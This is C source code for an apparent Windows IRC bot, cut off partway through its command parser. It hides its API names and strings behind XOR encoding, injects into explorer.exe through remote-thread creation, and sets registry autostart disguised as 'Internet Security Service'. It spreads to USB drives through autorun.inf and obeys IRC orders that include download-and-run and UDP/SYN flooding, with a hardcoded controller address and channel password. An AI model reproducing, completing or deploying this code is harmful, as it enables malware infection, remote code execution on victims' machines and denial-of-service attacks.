#pragma comment(linker, "/FILEALIGN:0x200")
#pragma comment(linker, "/IGNORE:4078 ")
#pragma optimize("gsy", on)

//#define DEBUG

#define IRCLINE					512
#define MAX_RECEIVE_BUFFER		1024
#define MAX_WORDS				8
#define CHANSIZE				128
#define STARTWAITTIME			10000

// config
#define RECONNECTSLEEP			10000
#define NICKLEN					6
#define MIDLEN					3
#define USBSLEEPTIME			10000
#define REGSLEEPTIME			2000

#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <tlhelp32.h>
#include "tcp.h"

typedef long NTSTATUS;
#define STATUS_SUCCESS                          ((NTSTATUS)0x00000000L)

// ntdll
typedef NTSTATUS (WINAPI *ZwWVM)(HANDLE,PVOID,PVOID,ULONG,PULONG);

// kernel32 - non injected
typedef HANDLE (WINAPI *CT32S)(DWORD,DWORD); // CreateToolhelp32Snapshot
typedef BOOL (WINAPI *P32F)(HANDLE,LPPROCESSENTRY32); // Process32First
typedef BOOL (WINAPI *P32N)(HANDLE,LPPROCESSENTRY32); // Process32Next
typedef HANDLE (WINAPI *OP)(DWORD,BOOL,DWORD); // OpenProcess
typedef DWORD (WINAPI *GMFN)(HMODULE,LPTSTR,DWORD); // GetModuleFileNameA
typedef LPVOID (WINAPI *VAE)(HANDLE,LPVOID,SIZE_T,DWORD,DWORD); // VirtualAllocEx
//typedef BOOL (WINAPI *WPM)(HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T*); // WriteProcessMemory
typedef HANDLE (WINAPI *CRT)(HANDLE,LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD); // CreateRemoteThread

// kernel32 - injected
typedef DWORD (WINAPI *WFSO)(HANDLE,DWORD); // WaitForSingleObject
typedef HANDLE (WINAPI *CM)(LPSECURITY_ATTRIBUTES,BOOL,LPCTSTR); // CreateMutexA
typedef HANDLE (WINAPI *CT)(LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD); // CreateThread
typedef VOID (WINAPI *ET)(DWORD); // ExitThread
typedef VOID (WINAPI *SLP)(DWORD); // Sleep
typedef DWORD (WINAPI *GTC)(void); // GetTickCount
typedef HANDLE (WINAPI *CF)(LPCTSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE); // CreateFileA
typedef BOOL (WINAPI *WF)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED); // WriteFile
typedef BOOL (WINAPI *CH)(HANDLE); // CloseHandle
typedef BOOL (WINAPI *CP)(LPCTSTR,LPTSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCTSTR,LPSTARTUPINFO,LPPROCESS_INFORMATION); // CreateProcessA
typedef DWORD (WINAPI *GLDS)(DWORD,LPTSTR); // GetLogicalDriveStringsA
typedef UINT (WINAPI *GDT)(LPCTSTR); // GetDriveTypeA
typedef BOOL (WINAPI *CD)(LPCTSTR,LPSECURITY_ATTRIBUTES); // CreateDirectoryA
typedef DWORD (WINAPI *GLE)(void); // GetLastError
typedef BOOL (WINAPI *SFA)(LPCTSTR,DWORD); // SetFileAttributesA
typedef BOOL (WINAPI *CFile)(LPCTSTR,LPCTSTR,BOOL); // CopyFileA
typedef BOOL (WINAPI *DF)(LPCTSTR); // DeleteFileA

typedef int (WINAPI *lsl)(LPCTSTR); // lstrlen
typedef LPTSTR (WINAPI *lsc)(LPTSTR,LPTSTR); // lstrcat
typedef int (WINAPI *lscmp)(LPCTSTR,LPCTSTR); // lstrcmp
typedef int (WINAPI *lscmpi)(LPCTSTR,LPCTSTR); // lstrcmpi
typedef LPTSTR (WINAPI *lscn)(LPTSTR,LPCTSTR,int); // lstrcpyn

// user32
#ifdef DEBUG
typedef BOOL (WINAPI *MB)(HWND,LPCTSTR,LPCTSTR,UINT); // MessageBoxA
#endif

// ws2_32
typedef int (WINAPI *WSAS)(WORD,LPWSADATA); // WSAStartup
typedef SOCKET (WINAPI *SOCK)(int,int,int); // socket
typedef int (WINAPI *CON)(SOCKET,const struct sockaddr *,int); // connect
typedef unsigned long (WINAPI *IADDR)(const char *); // inet_addr
typedef u_short (WINAPI *HTONS)(u_short); // htons
typedef int (WINAPI *SEND)(SOCKET,const char *,int,int); // send
typedef int (WINAPI *RECV)(SOCKET,char *,int,int); // recv
typedef int (WINAPI *CLSO)(SOCKET); // closesocket
typedef struct hostent* FAR (WINAPI *GHBN)(const char *); // gethostbyname
typedef int (WINAPI *SENDTO)(SOCKET,const char*,int,int,const struct sockaddr*,int); // sendto
typedef SOCKET (WINAPI *WSASock)(int,int,int,LPWSAPROTOCOL_INFO,GROUP,DWORD); // WSASocket
typedef u_long (WINAPI *HTONL)(u_long); // htonl
typedef int (WINAPI *sso)(SOCKET,int,int,const char*,int); // setsockopt


// wininet
typedef HINTERNET (WINAPI *IO)(LPCTSTR,DWORD,LPCTSTR,LPCTSTR,DWORD); // InternetOpenA
typedef HINTERNET (WINAPI *IOU)(HINTERNET,LPCTSTR,LPCTSTR,DWORD,DWORD,DWORD_PTR); // InternetOpenUrlA
typedef BOOL (WINAPI *ICH)(HINTERNET); // InternetCloseHandle
typedef BOOL (WINAPI *IRF)(HINTERNET,LPVOID,DWORD,LPDWORD); // InternetReadFile

// shell32
typedef HINSTANCE (WINAPI *SE)(HWND,LPCTSTR,LPCTSTR,LPCTSTR,LPCTSTR,INT); // ShellExecuteA

// advapi32
typedef LONG (WINAPI *RCKE)(HKEY,LPCTSTR,DWORD,LPTSTR,DWORD,REGSAM,LPSECURITY_ATTRIBUTES,PHKEY,LPDWORD); // RegCreateKeyExA
typedef LONG (WINAPI *RSVE)(HKEY,LPCTSTR,DWORD,DWORD,const BYTE *,DWORD); // RegSetValueExA
typedef LONG (WINAPI *RCK)(HKEY); // RegCloseKey
typedef LONG (WINAPI *RDK)(HKEY,LPCTSTR); // RegDeleteKeyA
typedef LONG (WINAPI *RDV)(HKEY,LPCTSTR); // RegDeleteValueA

//
typedef void (WINAPI *GL)(LPVOID,char *,unsigned int); // GenerateLetters

typedef struct
{
	char		*text;
	char		isdecoded;
} strings_s;

typedef struct
{
	char				*host;
	unsigned short		port;
} connectdata_s;

// servers to connect to (can use domain name too)
connectdata_s condata[] = 
{
	{"irc.tes.gov", 6667},
	{NULL, 0}
};

// put in processes names to try to inject to
char *inj_procs[] = {"explorer.exe", NULL};

char *apistr[] =
{
#define s_kernel32 0
	"\xC0\xCE\xD9\xC5\xCE\xC7\x98\x99\x85\xCF\xC7\xC7",
#define s_ws2_32 1
	"\xDC\xD8\x99\xF4\x98\x99\x85\xCF\xC7\xC7",
#define s_wininet 2
	"\xDC\xC2\xC5\xC2\xC5\xCE\xDF\x85\xCF\xC7\xC7", 
#define s_shell32 3
	"\xD8\xC3\xCE\xC7\xC7\x98\x99\x85\xCF\xC7\xC7", 
#define s_advapi32 4
	"\xCA\xCF\xDD\xCA\xDB\xC2\x98\x99\x85\xCF\xC7\xC7",
#define s_CreateToolhelp32Snapshot 5
	"\xE8\xD9\xCE\xCA\xDF\xCE\xFF\xC4\xC4\xC7\xC3\xCE\xC7\xDB\x98\x99\xF8\xC5\xCA\xDB\xD8\xC3\xC4\xDF",
#define s_Process32First 6
	"\xFB\xD9\xC4\xC8\xCE\xD8\xD8\x98\x99\xED\xC2\xD9\xD8\xDF",
#define s_Process32Next 7
	"\xFB\xD9\xC4\xC8\xCE\xD8\xD8\x98\x99\xE5\xCE\xD3\xDF",
#define s_OpenProcess 8
	"\xE4\xDB\xCE\xC5\xFB\xD9\xC4\xC8\xCE\xD8\xD8",
#define s_GetModuleFileNameA 9
	"\xEC\xCE\xDF\xE6\xC4\xCF\xDE\xC7\xCE\xED\xC2\xC7\xCE\xE5\xCA\xC6\xCE\xEA",
#define s_VirtualAllocEx 10
	"\xFD\xC2\xD9\xDF\xDE\xCA\xC7\xEA\xC7\xC7\xC4\xC8\xEE\xD3",
#define s_ZwWriteVirtualMemory 11
	"\xF1\xDC\xFC\xD9\xC2\xDF\xCE\xFD\xC2\xD9\xDF\xDE\xCA\xC7\xE6\xCE\xC6\xC4\xD9\xD2",
#define s_CreateRemoteThread 12
	"\xE8\xD9\xCE\xCA\xDF\xCE\xF9\xCE\xC6\xC4\xDF\xCE\xFF\xC3\xD9\xCE\xCA\xCF",
#define s_WaitForSingleObject 13
	"\xFC\xCA\xC2\xDF\xED\xC4\xD9\xF8\xC2\xC5\xCC\xC7\xCE\xE4\xC9\xC1\xCE\xC8\xDF",
#define s_CreateMutexA 14
	"\xE8\xD9\xCE\xCA\xDF\xCE\xE6\xDE\xDF\xCE\xD3\xEA",
#define s_CreateThread 15
	"\xE8\xD9\xCE\xCA\xDF\xCE\xFF\xC3\xD9\xCE\xCA\xCF",
#define s_ExitThread 16
	"\xEE\xD3\xC2\xDF\xFF\xC3\xD9\xCE\xCA\xCF", 
#define s_Sleep 17
	"\xF8\xC7\xCE\xCE\xDB",
#define s_GetTickCount 18
	"\xEC\xCE\xDF\xFF\xC2\xC8\xC0\xE8\xC4\xDE\xC5\xDF", 
#define s_CreateFileA 19
	"\xE8\xD9\xCE\xCA\xDF\xCE\xED\xC2\xC7\xCE\xEA", 
#define s_WriteFile 20
	"\xFC\xD9\xC2\xDF\xCE\xED\xC2\xC7\xCE", 
#define s_CloseHandle 21
	"\xE8\xC7\xC4\xD8\xCE\xE3\xCA\xC5\xCF\xC7\xCE", 
#define s_CreateProcessA 22
	"\xE8\xD9\xCE\xCA\xDF\xCE\xFB\xD9\xC4\xC8\xCE\xD8\xD8\xEA", 
#define s_GetLogicalDriveStringsA 23
	"\xEC\xCE\xDF\xE7\xC4\xCC\xC2\xC8\xCA\xC7\xEF\xD9\xC2\xDD\xCE\xF8\xDF\xD9\xC2\xC5\xCC\xD8\xEA", 
#define s_GetDriveTypeA 24
	"\xEC\xCE\xDF\xEF\xD9\xC2\xDD\xCE\xFF\xD2\xDB\xCE\xEA", 
#define s_CreateDirectoryA 25
	"\xE8\xD9\xCE\xCA\xDF\xCE\xEF\xC2\xD9\xCE\xC8\xDF\xC4\xD9\xD2\xEA", 
#define s_GetLastError 26
	"\xEC\xCE\xDF\xE7\xCA\xD8\xDF\xEE\xD9\xD9\xC4\xD9", 
#define s_SetFileAttributesA 27
	"\xF8\xCE\xDF\xED\xC2\xC7\xCE\xEA\xDF\xDF\xD9\xC2\xC9\xDE\xDF\xCE\xD8\xEA", 
#define s_CopyFileA 28
	"\xE8\xC4\xDB\xD2\xED\xC2\xC7\xCE\xEA", 
#define s_DeleteFileA 29
	"\xEF\xCE\xC7\xCE\xDF\xCE\xED\xC2\xC7\xCE\xEA", 
#define s_lstrlen 30
	"\xC7\xD8\xDF\xD9\xC7\xCE\xC5", 
#define s_lstrcat 31
	"\xC7\xD8\xDF\xD9\xC8\xCA\xDF", 
#define s_lstrcmp 32
	"\xC7\xD8\xDF\xD9\xC8\xC6\xDB", 
#define s_lstrcmpi 33
	"\xC7\xD8\xDF\xD9\xC8\xC6\xDB\xC2", 
#define s_lstrcpyn 34
	"\xC7\xD8\xDF\xD9\xC8\xDB\xD2\xC5", 
#define s_WSAStartup 35
	"\xFC\xF8\xEA\xF8\xDF\xCA\xD9\xDF\xDE\xDB", 
#define s_socket 36
	"\xD8\xC4\xC8\xC0\xCE\xDF", 
#define s_connect 37
	"\xC8\xC4\xC5\xC5\xCE\xC8\xDF", 
#define s_inet_addr 38
	"\xC2\xC5\xCE\xDF\xF4\xCA\xCF\xCF\xD9", 
#define s_htons 39
	"\xC3\xDF\xC4\xC5\xD8", 
#define s_send 40
	"\xD8\xCE\xC5\xCF", 
#define s_recv 41
	"\xD9\xCE\xC8\xDD", 
#define s_closesocket 42
	"\xC8\xC7\xC4\xD8\xCE\xD8\xC4\xC8\xC0\xCE\xDF", 
#define s_gethostbyname 43
	"\xCC\xCE\xDF\xC3\xC4\xD8\xDF\xC9\xD2\xC5\xCA\xC6\xCE",
#define s_InternetOpenA 44
	"\xE2\xC5\xDF\xCE\xD9\xC5\xCE\xDF\xE4\xDB\xCE\xC5\xEA",
#define s_InternetOpenUrlA 45
	"\xE2\xC5\xDF\xCE\xD9\xC5\xCE\xDF\xE4\xDB\xCE\xC5\xFE\xD9\xC7\xEA",
#define s_InternetCloseHandle 46
	"\xE2\xC5\xDF\xCE\xD9\xC5\xCE\xDF\xE8\xC7\xC4\xD8\xCE\xE3\xCA\xC5\xCF\xC7\xCE",
#define s_InternetReadFile 47
	"\xE2\xC5\xDF\xCE\xD9\xC5\xCE\xDF\xF9\xCE\xCA\xCF\xED\xC2\xC7\xCE",
#define s_ShellExecuteA 48
	"\xF8\xC3\xCE\xC7\xC7\xEE\xD3\xCE\xC8\xDE\xDF\xCE\xEA",
#define s_RegCreateKeyExA 49
	"\xF9\xCE\xCC\xE8\xD9\xCE\xCA\xDF\xCE\xE0\xCE\xD2\xEE\xD3\xEA",
#define s_RegSetValueExA 50
	"\xF9\xCE\xCC\xF8\xCE\xDF\xFD\xCA\xC7\xDE\xCE\xEE\xD3\xEA",
#define s_RegCloseKey 51
	"\xF9\xCE\xCC\xE8\xC7\xC4\xD8\xCE\xE0\xCE\xD2",
#define s_RegDeleteKeyA 52
	"\xF9\xCE\xCC\xEF\xCE\xC7\xCE\xDF\xCE\xE0\xCE\xD2\xEA",
#define s_RegDeleteValueA 53
	"\xF9\xCE\xCC\xEF\xCE\xC7\xCE\xDF\xCE\xFD\xCA\xC7\xDE\xCE\xEA",
#define s_ntdll 54
	"\xC5\xDF\xCF\xC7\xC7\x85\xCF\xC7\xC7",
	NULL
};

// first parameter is string, second one is either:
// 1 = string is already decoded
// 0 = string is encoded and needs to be decoded before usage
strings_s strings[] =
{
	/**************CONFIG-MAIN****************/
	#define s_decodekey 0
	{"f424", 1},
	#define s_filename 1
	{"ise32.exe", 1},
	#define s_mutex 2
	{"asd-6+094697__", 1},
	#define s_autostartkey 3
	{"{28ABC5C0-4FCB-11CF-AAX5-81CX1C635612}", 1},
	#define s_botversion 4
	{"1.4.0", 1},
	#define s_ircorderprefix 5
	{"!", 1},
	#define s_masterhost 6
	{"94.102.55.189", 1},
	#define s_password 7
	{"", 1},
	#define s_channel 8
	{"#howietes#", 1},
	#define s_channelpass 9
	{"KillerZ2009", 1},
	#define s_channel_usb 10
	{"#howietes.usb#", 1},
	/**************CONFIG-ORDERS****************/
	#define s_order_version 11  // version
	{"v", 1},
	#define s_order_die 12
	{"d", 1},
	#define s_order_r 13
	{"r", 1},
	#define s_order_r2 14
	{"q", 1},
	#define s_order_remove 15  // remove
	{"rem", 1},
	#define s_order_dl 16  // download
	{"dl", 1},
	#define s_order_join 17
	{"j", 1},
	#define s_order_part 18
	{"p", 1},
	/**************IRC STRINGS****************/
	#define s_pass 19
	{"\xFB\xEA\xF8\xF8\x8B", 0},
	#define s_nick 20
	{"\xE5\xE2\xE8\xE0\x8B", 0},
	#define s_user 21
	{"\xFE\xF8\xEE\xF9\x8B", 0},
	#define s_usermid1 22
	{" \"\" \"", 1},
	#define s_usermid2 23
	{"\" :", 1},
	#define s_motd 24
	{"\xE6\xE4\xFF\xEF", 0},
	#define s_ping 25
	{"\xFB\xE2\xE5\xEC", 0},
	#define s_pong 26
	{"\xFB\xE4\xE5\xEC\x8B", 0},
	#define s_join 27
	{"\xE1\xE4\xE2\xE5\x8B", 0},
	#define s_part 28
	{"\xFB\xEA\xF9\xFF\x8B", 0},
	#define s_privmsg 29
	{"\xFB\xF9\xE2\xFD\xE6\xF8\xEC", 0},
	#define s_332 30
	{"\x98\x98\x99", 0},
	#define s_433 31
	{"\x9F\x98\x98", 0},
	#define s_dbldot 32
	{" :", 1},
	#define s_newline 33
	{"\r\n", 1},
	#define s_space 34
	{" ", 1},
	#define s_usb_infect 35
	{"\xE2\xC5\xCD\xCE\xC8\xDF\xCE\xCF\x8B\xDE\xD8\xC9\x8B\xCF\xD9\xC2\xDD\xCE\x91\x8B", 0},
	/**************DOWNLOADER STRINGS****************/
	#define s_internetopen 36
	{"Mozilla", 1},
	#define s_success 37
	{"Success.", 1},
	#define s_failed 38
	{"Failed.", 1},
	/**************USB-SPREAD STRINGS****************/
	#define s_usb_recycler 39
	{"\xF7\xF9\xEE\xE8\xF2\xE8\xE7\xEE\xF9", 0},
	#define s_usb_recsubdir 40
	{"\xF7\xF8\x86\x9A\x86\x9E\x86\x99\x9A\x86\x9A\x9F\x93\x99\x9F\x9C\x9D\x9E\x9B\x9A\x86\x9A\x9D\x9F\x9F\x9F\x92\x9A\x92\x98\x9C\x86\x9D\x93\x99\x9B\x9B\x98\x98\x98\x9B\x86\x9A\x9B\x9A\x98", 0},
	#define s_usb_desktopinidata 41
	{"\xF0\x85\xF8\xC3\xCE\xC7\xC7\xE8\xC7\xCA\xD8\xD8\xE2\xC5\xCD\xC4\xF6\xA1\xE8\xE7\xF8\xE2\xEF\x96\xD0\x9D\x9F\x9E\xED\xED\x9B\x9F\x9B\x86\x9E\x9B\x93\x9A\x86\x9A\x9B\x9A\xE9\x86\x92\xED\x9B\x93\x86\x9B\x9B\xEA\xEA\x9B\x9B\x99\xED\x92\x9E\x9F\xEE\xD6", 0},
	#define s_usb_desktopini 42
	{"\xF7\xEF\xCE\xD8\xC0\xDF\xC4\xDB\x85\xC2\xC5\xC2", 0},
	#define s_usb_autoruninf 43
	{"\xF7\xCA\xDE\xDF\xC4\xD9\xDE\xC5\x85\xC2\xC5\xCD", 0},
	#define s_usb_autorundata1 44
	{"\xF0\xCA\xDE\xDF\xC4\xD9\xDE\xC5\xF6\xA1\xC4\xDB\xCE\xC5\x96", 0},
	#define s_usb_autorundata2 45
	{"\xA1\xC2\xC8\xC4\xC5\x96\x8E\xF8\xD2\xD8\xDF\xCE\xC6\xF9\xC4\xC4\xDF\x8E\xF7\xD8\xD2\xD8\xDF\xCE\xC6\x98\x99\xF7\xF8\xE3\xEE\xE7\xE7\x98\x99\x85\xCF\xC7\xC7\x87\x9F\xA1\xCA\xC8\xDF\xC2\xC4\xC5\x96\xE4\xDB\xCE\xC5\x8B\xCD\xC4\xC7\xCF\xCE\xD9\x8B\xDF\xC4\x8B\xDD\xC2\xCE\xDC\x8B\xCD\xC2\xC7\xCE\xD8\xA1\xD8\xC3\xCE\xC7\xC7\xF7\xC4\xDB\xCE\xC5\x96\xE4\xDB\xCE\xC5\xA1\xD8\xC3\xCE\xC7\xC7\xF7\xC4\xDB\xCE\xC5\xF7\xC8\xC4\xC6\xC6\xCA\xC5\xCF\x96", 0},
	#define s_usb_autorundata3 46
	{"\xA1\xD8\xC3\xCE\xC7\xC7\xF7\xC4\xDB\xCE\xC5\xF7\xCF\xCE\xCD\xCA\xDE\xC7\xDF\x96\x9A", 0},
	/**************INSTALL STRINGS****************/
	#define s_c 47
	{"c:", 1},
	#define s_dblslash 48
	{"\\", 1},
	/**************AUTOSTART STRINGS****************/
	#define s_autostartreg 49
	{"\xF8\xC4\xCD\xDF\xDC\xCA\xD9\xCE\xF7\xE6\xC2\xC8\xD9\xC4\xD8\xC4\xCD\xDF\xF7\xEA\xC8\xDF\xC2\xDD\xCE\x8B\xF8\xCE\xDF\xDE\xDB\xF7\xE2\xC5\xD8\xDF\xCA\xC7\xC7\xCE\xCF\x8B\xE8\xC4\xC6\xDB\xC4\xC5\xCE\xC5\xDF\xD8", 0},
	#define s_stubpath 50
	{"\xF8\xDF\xDE\xC9\xFB\xCA\xDF\xC3", 0},
	#define s_autostartreg_guestacc 51
	{"\xF8\xC4\xCD\xDF\xDC\xCA\xD9\xCE\xF7\xE6\xC2\xC8\xD9\xC4\xD8\xC4\xCD\xDF\xF7\xFC\xC2\xC5\xCF\xC4\xDC\xD8\xF7\xE8\xDE\xD9\xD9\xCE\xC5\xDF\xFD\xCE\xD9\xD8\xC2\xC4\xC5\xF7\xF9\xDE\xC5", 0},
	#define s_autostartreg_def 52
	{"Internet Security Service", 1},
	/**************MISC****************/
	#define s_order_silent 53
	{"s", 1},
	#define s_star 54
	{"*", 1},
	#define s_ddos_start 55
	{"Start flooding.", 1},
	#define s_ddos_end 56
	{"Flooding done.", 1},
	#define s_order_ddos_udp 57
	{"udp", 1},
	#define s_order_ddos_syn 58
	{"syn", 1},
	#define s_order_ddos_stop 59
	{"fstop", 1},
	#define laststring 60
	{NULL, 0}
};

typedef struct
{    	
	WFSO WaitForSingleObject;
	CM CreateMutex;
	CT CreateThread;
	ET ExitThread;
	SLP Sleep;
	GTC GetTickCount;
	CF CreateFile;
	WF WriteFile;
	CH CloseHandle;
	CP CreateProcess;
	GLDS GetLogicalDriveStrings;
	GDT GetDriveType;
	CD CreateDirectory;
	GLE GetLastError;
	SFA SetFileAttributes;
	CFile CopyFile;
	DF DeleteFile;
	lsl lstrlen;
	lsc lstrcat;
	lscmp lstrcmp;
	lscmpi lstrcmpi;
	lscn lstrcpyn;
// user32
#ifdef DEBUG
	MB MessageBox;
#endif
// ws2_32
	WSAS WSAStartup;
	SOCK socket;
	CON connect;
	IADDR inet_addr;
	HTONS htons;
	SEND send;
	RECV recv;
	CLSO closesocket;
	GHBN gethostbyname;
	SENDTO sendto;
	WSASock WSASocket;
	HTONL htonl;
	sso setsockopt;
// wininet
	IO InternetOpen;
	IOU InternetOpenUrl;
	IRF InternetReadFile;
	ICH InternetCloseHandle;
// shell32
	SE ShellExecute;
// advapi32
	RCK RegCloseKey;
	RSVE RegSetValueEx;
	RCKE RegCreateKeyEx;
	RDK RegDeleteKey;
	RDV RegDeleteValue;
} ext_functions_s;

typedef struct
{
	LPVOID DL_Thread;
	LPVOID USB_Thread;
	LPVOID REG_Thread;
	LPVOID DDOS_Thread;
	GL GenerateLetters;
} int_functions_s;

typedef struct _INJECT_STRUCT 
{
	ext_functions_s		*efs;
	int_functions_s		*ifs;
	strings_s			*strings;
	connectdata_s		*condata;
	long				holdrand;
	char				nick[NICKLEN + 1];
	char				user[NICKLEN + 1];
	char				mid[NICKLEN + 1];
	char				dlurl[MAX_PATH];
	char				dlfile[MAX_PATH];
	char				dlmode;
	char				pending;
	SOCKET				ircsock;
	char				from[CHANSIZE];
	char				module[MAX_PATH];
	char				silent;
	char				ddos_ip[16];
	unsigned short		ddos_port;
	int					ddos_packets;
	char				ddoson;
} INJECT_STRUCT, *PINJECT_STRUCT;


_inline unsigned long batoi(char *str)
{
	unsigned long num = 0;
	int	i;

	for (i = 0; str[i] != 0; i++)
	{
		num = num * 10;

		if (str[i] == '1')
			num += 1;
		else if (str[i] == '2')
			num += 2;
		else if (str[i] == '3')
			num += 3;
		else if (str[i] == '4')
			num += 4;
		else if (str[i] == '5')
			num += 5;
		else if (str[i] == '6')
			num += 6;
		else if (str[i] == '7')
			num += 7;
		else if (str[i] == '8')
			num += 8;
		else if (str[i] == '9')
			num += 9;
	}

	return num;
}

_inline void bsrand(long *holdrand, unsigned int seed)
{
	*holdrand = (long) seed;
}

_inline int brand(long *holdrand)
{
	return (((*holdrand = *holdrand * 214013L + 2531011L) >> 16) & 0x7fff);
}

_inline char *bstrstr(const char *str1, const char *str2)
{
  char *cp = (char *) str1;
  char *s1, *s2;

  if (!*str2) return (char *) str1;

  while (*cp)
  {
    s1 = cp;
    s2 = (char *) str2;

    while (*s1 && *s2 && !(*s1 - *s2)) s1++, s2++;
    if (!*s2) return cp;
    cp++;
  }

  return NULL;
}

_inline int bstrncmp(const char *s1, const char *s2, size_t count)
{
  if (!count) return 0;

  while (--count && *s1 && *s1 == *s2)
  {
    s1++;
    s2++;
  }

  return *(unsigned char *) s1 - *(unsigned char *) s2;
}

_inline char *bstrchr(const char *s, int ch)
{
  while (*s && *s != (char) ch) s++;
  if (*s == (char) ch) return (char *) s;
  return NULL;
}

_inline void Decode(LPVOID injStr)
{
	PINJECT_STRUCT pInj = (PINJECT_STRUCT)injStr;
	int		i, j, num;

	for (num = 1; num < laststring; num++)
	{
		if (pInj->strings[num].isdecoded == 1)
			continue;

		for (i = 0; i < pInj->efs->lstrlen(pInj->strings[num].text); i++)
		{
			for (j = 0; j < pInj->efs->lstrlen(pInj->strings[s_decodekey].text); j++)
				pInj->strings[num].text[i] ^= pInj->strings[s_decodekey].text[j];

			pInj->strings[num].text[i] = ~ pInj->strings[num].text[i];
		}

		pInj->strings[num].isdecoded = 1;
	}

	return;
}

_inline unsigned int Resolve(LPVOID injStr, char *host) 
{
	PINJECT_STRUCT pInj = (PINJECT_STRUCT)injStr;
   	struct	hostent		*hp;
    unsigned int		host_ip;

    host_ip = pInj->efs->inet_addr(host);
    if (host_ip == INADDR_NONE) 
	{
        hp = pInj->efs->gethostbyname(host);
        if (hp == 0) 
           	return 0;
		else 
			host_ip = *(u_int *)(hp->h_addr);
    }

    return host_ip;
}

_inline int IRC_Connect(LPVOID injStr, char *host, unsigned short port)
{
	PINJECT_STRUCT pInj = (PINJECT_STRUCT)injStr;
	unsigned int		resv_host;
	struct sockaddr_in	address;
	SOCKET				sock;

	resv_host = Resolve(injStr, host);
	if (resv_host == 0)
		return -1;

	address.sin_addr.s_addr = resv_host;
	address.sin_family = AF_INET;
	address.sin_port = pInj->efs->htons(port);

	if ((sock = pInj->efs->socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
		return -2;

	if (pInj->efs->connect(sock, (struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR)
		return -3;
	else
		return sock;
}

_inline int IRC_Login(LPVOID injStr, SOCKET sock)
{
	PINJECT_STRUCT pInj = (PINJECT_STRUCT)injStr;
	char	buff[IRCLINE];
	int		l;

	for (l = 0; l < sizeof(buff); l++)
			buff[l] = 0;

	if (pInj->strings[s_password].text != NULL)
	{
		pInj->efs->lstrcat(buff, pInj->strings[s_pass].text);
		pInj->efs->lstrcat(buff, pInj->strings[s_password].text);
		pInj->efs->lstrcat(buff, pInj->strings[s_newline].text);
		pInj->efs->send(sock, buff, pInj->efs->lstrlen(buff), 0);
	}

	for (l = 0; l < sizeof(buff); l++)
			buff[l] = 0;
	pInj->efs->lstrcat(buff, pInj->strings[s_nick].text);
	pInj->efs->lstrcat(buff, pInj->nick);
	pInj->efs->lstrcat(buff, pInj->strings[s_newline].text);
	pInj->efs->send(sock, buff, pInj->efs->lstrlen(buff), 0);

	for (l = 0; l < sizeof(buff); l++)
			buff[l] = 0;
	pInj->efs->lstrcat(buff, pInj->strings[s_user].text);
	pInj->efs->lstrcat(buff, pInj->user);
	pInj->efs->lstrcat(buff, pInj->strings[s_usermid1].text);
	pInj->efs->lstrcat(buff, pInj->mid);
	pInj->efs->lstrcat(buff, pInj->strings[s_usermid2].text);
	pInj->efs->lstrcat(buff, pInj->user);
	pInj->efs->lstrcat(buff, pInj->strings[s_newline].text);
	pInj->efs->send(sock, buff, pInj->efs->lstrlen(buff), 0);

	return 1;
}

_inline int IRC_ParseSingleCommand(LPVOID injStr, SOCKET sock, char **word, int p, char *from)
{
	PINJECT_STRUCT pInj = (PINJECT_STRUCT)injStr;
	char		buff[IRCLINE];
	int			i;
	DWORD		id;

	for (i = 0; i < sizeof(buff); i++)
		buff[i] = 0;

	if (!pInj->efs->lstrcmp(word[p], pInj->strings[s_order_version].text))
	{
		pInj->efs->lstrcat(buff, pInj->strings[s_privmsg].text);
		pInj->efs->lstrcat(buff, pInj->strings[s_space].text);
		pInj->efs->lstrcat(buff, from);
		pInj->efs->lstrcat(buff, pInj->strings[s_dbldot].text);
		pInj->efs->lstrcat(buff, pInj->strings[s_botversion].text);
		pInj->efs->lstrcat(buff, pInj->strings[s_newline].text);
		if (pInj->silent == '0')
			pInj->efs->send(sock, buff, pInj->efs->lstrlen(buff), 0);
		return 1;
	}
	else if (!pInj->efs->lstrcmp(word[p], pInj->strings[s_order_r].text))
	{
		return -2;
	}
	else if (!pInj->efs->lstrcmp(word[p], pInj->strings[s_order_r2].text))
	{
		return -3;
	}
	else if (!pInj->efs->lstrcmp(word[p], pInj->strings[s_order_die].text))
	{
		return -4;
	}
	else if (!pInj->efs->lstrcmp(word[p], pInj->strings[s_order_remove].text))
	{
		return -5;
	}
	else if (!pInj->efs->lstrcmp(word[p], pInj->strings[s_order_ddos_stop].text))
	{
		pInj->ddoson = 0;
		return 1;
	}
	else if (word[p + 1] == NULL)
		return 0;
	else if (!pInj->efs->lstrcmp(word[p], pInj->strings[s_order_silent].text))
	{
		pInj->silent = word[p + 1][0];
		return 1;
	}
	else if (!pInj->efs->lstrcmp(word[p], pInj->strings[s_order_join].text))
	{
		pInj->efs->lstrcat(buff, pInj->strings[s_join].text);
		pInj->efs->lstrcat(buff, word[p + 1]);
		if (word[p + 2] != NULL)
		{
			pInj->efs->lstrcat(buff, pInj->strings[s_space].text);
			pInj->efs->lstrcat(buff, word[p + 2]);
		}
		pInj->efs->lstrcat(buff, pInj->strings[s_newline].text);
		pInj->efs->send(sock, buff, pInj->efs->lstrlen(buff), 0);
		return 1;
	}
	else if (!pInj->efs->lstrcmp(word[p], pInj->strings[s_order_part].text))
	{
		pInj->efs->lstrcat(buff, pInj->strings[s_part].text);
		pInj->efs->lstrcat(buff, word[p + 1]);
		pInj->efs->lstrcat(buff, pInj->strings[s_newline].text);
		pInj->efs->send(sock, buff, pInj->efs->lstrlen(buff), 0);
		return 1;
	}
	else if (word[p + 2] == NULL)
		return 0;
	else if (word[p + 3] == NULL)
		return 0;
	else if (!pInj->efs->lstrcmp(word[p], pInj->strings[s_order_dl].text))
	{
		pInj->dlmode = 0;
		pInj->efs->lstrcpyn(pInj->dlurl, word[p + 1], sizeof(pInj->dlurl));
		pInj->efs->lstrcpyn(pInj->dlfile, word[p + 2], sizeof(pInj->dlfile));
		pInj->dlmode = word[p + 3][0];
